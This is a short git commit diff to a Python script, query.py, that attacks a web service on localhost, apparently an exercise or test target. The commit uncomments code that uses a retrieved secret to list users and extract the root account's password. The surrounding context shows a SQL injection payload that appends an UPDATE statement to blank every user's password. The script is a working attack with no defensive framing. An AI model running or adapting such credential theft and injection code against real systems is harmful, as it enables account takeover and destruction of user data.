d8fa8c66eb74e993fd9f9d322fde89251d8c32c1
Anatolii Neliubin <anatolii@google.com>
2020-11-13 11:35:08 +0500

    uncommented obtaining root's password

--- query.py
+++ query.py
@@ -6,15 +6,15 @@ r = requests.get('http://127.0.0.1:5000',params=ploads)
 r_dictionary = r.json()
 secret = r_dictionary["secret"]
 
-# # Will obtain the root's password
-# ploads = {'secret': secret}
-# r = requests.get('http://127.0.0.1:5000/users',params=ploads)
-# r_dictionary = r.json()
-# for i in r_dictionary:
-#     v = list(i.values())
-#     if v[1] == "root":
-#         password = v[0]
-#         break
+# Will obtain the root's password
+ploads = {'secret': secret}
+r = requests.get('http://127.0.0.1:5000/users',params=ploads)
+r_dictionary = r.json()
+for i in r_dictionary:
+    v = list(i.values())
+    if v[1] == "root":
+        password = v[0]
+        break
 
 
 ploads = {'secret': secret + "'; UPDATE users SET password='' --",}
